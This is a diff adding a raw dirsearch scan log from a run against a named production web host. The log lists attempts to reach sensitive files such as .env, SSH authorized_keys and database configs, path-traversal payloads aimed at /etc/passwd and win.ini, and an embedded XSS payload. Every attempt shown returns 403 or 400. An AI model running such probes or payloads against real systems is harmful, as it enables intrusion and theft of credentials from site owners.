@@ -1,0 +1,36 @@
+# Dirsearch started Mon Aug 19 16:24:18 2024 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u ws-request-prd.plusgrade.com -w /home/zeny/payloads/juicy_files.txt
+
+403   520B   https://ws-request-prd.plusgrade.com/__downloader_off/connect.cfg
+403   520B   https://ws-request-prd.plusgrade.com/__bx_log.log
+403   520B   https://ws-request-prd.plusgrade.com/__init__.py
+403   520B   https://ws-request-prd.plusgrade.com/__r2/query-printRows.view?schemaName=ListManager&query.queryName=ListManager&query.sort=Nameelk5q%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ezp59r&query.containerFilterName=CurrentAndSubfolders&query.selectionKey=%24ListManager%24ListManager%24%24query&query.showRows=ALL
+403   520B   https://ws-request-prd.plusgrade.com/__tests__/test-become/.env
+403   520B   https://ws-request-prd.plusgrade.com/_/.ssh/authorized_keys
+403   520B   https://ws-request-prd.plusgrade.com/_admin/scripts/setup.php
+403   520B   https://ws-request-prd.plusgrade.com/_config.php
+403   520B   https://ws-request-prd.plusgrade.com/_config.yml
+403   520B   https://ws-request-prd.plusgrade.com/_database.php
+403   520B   https://ws-request-prd.plusgrade.com/_database_config.php
+403   520B   https://ws-request-prd.plusgrade.com/_debug.log
+403   520B   https://ws-request-prd.plusgrade.com/_log/error.log
+403   520B   https://ws-request-prd.plusgrade.com/_log/access.log
+403   520B   https://ws-request-prd.plusgrade.com/_logs/access.log
+403   520B   https://ws-request-prd.plusgrade.com/_logs/access_log
+403   520B   https://ws-request-prd.plusgrade.com/_logs/err.log
+403   520B   https://ws-request-prd.plusgrade.com/_mails.log
+403   520B   https://ws-request-prd.plusgrade.com/_logs/error.log
+403   520B   https://ws-request-prd.plusgrade.com/_logs/error_log
+403   520B   https://ws-request-prd.plusgrade.com/_mem_bin/autoconfig.asp
+400   122B   https://ws-request-prd.plusgrade.com/_next/../../../../../../../../../etc/passwd
+400   122B   https://ws-request-prd.plusgrade.com/_next/../../../../../../../../../../etc/passwd
+403   520B   https://ws-request-prd.plusgrade.com/_next/static/../server/pages-manifest.json
+403   520B   https://ws-request-prd.plusgrade.com/_phpmyadmin/scripts/setup.php
+400   122B   https://ws-request-prd.plusgrade.com/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd
+403   520B   https://ws-request-prd.plusgrade.com/_s_/dyn/Log_highlight?href=../../../../windows/win.ini&n=1#selected
+403   520B   https://ws-request-prd.plusgrade.com/_static/.env
+403   520B   https://ws-request-prd.plusgrade.com/_uuidsredis.conf
+403   520B   https://ws-request-prd.plusgrade.com/_wp-config.php
+403   520B   https://ws-request-prd.plusgrade.com/!.gitignore
+403   520B   https://ws-request-prd.plusgrade.com/!access_setup.asp
+403   520B   https://ws-request-prd.plusgrade.com/!mssql_setup.asp
+403   520B   https://ws-request-prd.plusgrade.com/!mysql_setup.asp
